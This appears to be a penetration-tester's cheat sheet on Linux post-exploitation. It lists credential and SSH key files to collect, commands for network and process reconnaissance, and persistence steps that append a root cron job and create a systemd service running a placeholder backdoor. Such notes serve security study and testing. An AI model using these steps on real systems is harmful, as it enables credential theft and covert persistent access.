---
layout: notes
permalink: /notes/linux/post/
title: Linux Post Exploitation
---

# Linux Post Exploitation

## Data Collection

### Sensitive Files
```bash
# Common locations
/etc/shadow
/etc/passwd
/etc/ssh/ssh_host_*
/home/*/.ssh/id_*
/root/.ssh/id_*
```

### Network Information
```bash
# Gather network data
ip neighbor
route -n
cat /etc/hosts
cat /etc/resolv.conf
```

### Process Information
```bash
ps auxf
pstree -a
lsof -i
```

## Persistence Techniques

### SSH Keys
- Generate new SSH key pair
- Add to authorized_keys
- Modify SSH configuration

### Cron Jobs
```bash
# Add persistent cron job
echo "* * * * * /path/to/backdoor" >> /var/spool/cron/crontabs/root
```

### Service Creation
```bash
# Create systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/path/to/backdoor

[Install]
WantedBy=multi-user.target
EOF
```